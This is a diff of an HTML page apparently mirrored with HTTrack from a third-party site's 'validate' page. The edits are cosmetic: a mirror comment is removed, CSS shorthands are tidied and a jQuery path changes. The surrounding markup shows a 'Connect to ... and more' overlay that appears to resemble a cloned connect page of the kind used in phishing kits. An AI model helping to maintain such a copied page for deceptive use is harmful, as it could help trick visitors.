@@ -2,7 +2,6 @@
 <!DOCTYPE html>
 <html>
 
-<!-- Mirrored from connect.myartvortex.com/validate.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 15 Nov 2023 01:09:06 GMT -->
 <head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
 <link href="files/main.css" rel="stylesheet">
@@ -477,14 +476,12 @@
       -ms-flex-align: center;
       align-items: center;
       text-align: center;
-      padding: 0 32px;
-      padding-top: 30px;
+      padding: 30px 32px 0;
     }
 
     @media screen and (max-width:640px) {
       .hDbjSS {
-        padding: 0 24px;
-        padding-top: 20px;
+        padding: 20px 24px 0;
       }
     }
 
@@ -619,7 +616,7 @@
 <body>
 <div class="overlay" id="thebox" style="display: none; margin-top: -50px;">
   <div class="overbox">
-    <div style="overflow:hidden;margin:5px 0px;">
+    <div style="overflow:hidden;margin:5px 0;">
       <div class="closex" onclick="shutx('#thebox')">X</div>
     </div>
     <div class="insidewidth onediv">
@@ -663,13 +660,13 @@
       </div>
       <div class="dsdiv fxz" onclick="startjob()">
         <div class="textdx" id="extracttext" style="font-weight: bold;"></div>
-        <div class="textdx" style="font-size:13px;margin:7px 0px">Connect to <span id="extracttext2"></span> and more</div>
+        <div class="textdx" style="font-size:13px;margin:7px 0;">Connect to <span id="extracttext2"></span> and more</div>
       </div>
     </div>
   </div>
 </div>
 
-<script src="../code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="code.jquery.com/jquery-3.6.0.min.js"></script>
 
 
 
